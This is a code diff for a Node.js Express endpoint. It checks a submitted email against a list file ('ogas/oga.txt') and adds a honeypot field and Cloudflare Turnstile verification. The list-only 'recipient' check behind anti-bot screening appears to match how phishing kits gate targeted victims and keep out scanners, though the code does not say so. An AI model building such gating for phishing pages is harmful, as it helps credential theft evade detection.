@@ -5,11 +5,12 @@ const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
 const fetch = require('node-fetch');
-const rateLimit = require('express-rate-limit'); // ✅ Re-enabled
+const rateLimit = require('express-rate-limit');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
+const CLOUDFLARE_SECRET = process.env.CLOUDFLARE_SECRET;
 
 let validEmails = [];
 function loadEmails() {
@@ -23,36 +24,57 @@ function loadEmails() {
 }
 loadEmails();
 
-// ✅ Re-enabled rate limiter
 const limiter = rateLimit({
-  windowMs: 60 * 1000, // 1 minute
-  max: 400,            // limit each IP to 400 requests per windowMs
+  windowMs: 60 * 1000,
+  max: 400, // feel free to adjust as needed
   message: { valid: false, message: 'Too many requests, try again later.' },
 });
 
 app.use(cors());
 app.use(express.json());
-app.use(limiter); // ✅ Active now
+app.use(limiter);
 
-// Internal email validation logic (no proxy)
-app.post('/api/check-email', (req, res) => {
-  const { email, captchaToken } = req.body;
+app.post('/api/check-email', async (req, res) => {
+  const { email, captchaToken, middleName } = req.body;
 
-  if (!email || typeof email !== 'string') {
-    return res.status(400).json({ valid: false, message: 'Email is required' });
+  // Honeypot anti-bot trap
+  if (middleName && middleName.trim() !== '') {
+    console.warn('[BOT] Honeypot field triggered');
+    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
   }
 
-  const normalizedEmail = email.trim().toLowerCase();
-  const found = validEmails.includes(normalizedEmail);
-
-  if (!found) {
-    return res.status(404).json({ valid: false, message: 'Email not found' });
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    console.warn('[WARN] Invalid or missing email attempt:', email);
+    return res.status(400).json({ valid: false, message: 'Invalid or missing email format' });
   }
 
-  // Optional: validate captchaToken here if needed
-  res.json({ valid: true, message: 'Email verified' });
+  if (!captchaToken) {
+    console.warn('[WARN] Missing captcha token attempt');
+    return res.status(400).json({ valid: false, message: 'Captcha missing' });
+  }
+
+  // Cloudflare CAPTCHA verification
+  try {
+    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `secret=${CLOUDFLARE_SECRET}&response=${captchaToken}`,
+    });
+    const verifyData = await verifyRes.json();
+    if (!verifyData.success) {
+      console.warn('[WARN] Captcha verification failed:', verifyData);
+      return res.status(400).json({ valid: false, message: 'Captcha failed. Please reload the page' });
+    }
+  } catch (err) {
+    console.error('[ERROR] Captcha verification error:', err);
+    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
+  }
+
+  const isValid = validEmails.includes(email.toLowerCase());
+  console.log(`[INFO] Email verification result for ${email}: ${isValid}`);
+  res.json({ valid: isValid, message: isValid ? 'Valid email' : 'Enter the valid recipient email to continue' });
 });
 
 app.listen(PORT, () => {
-  console.log(`Proxy-secured backend running on http://localhost:${PORT}`);
+  console.log(`Backend running on http://localhost:${PORT}`);
 });
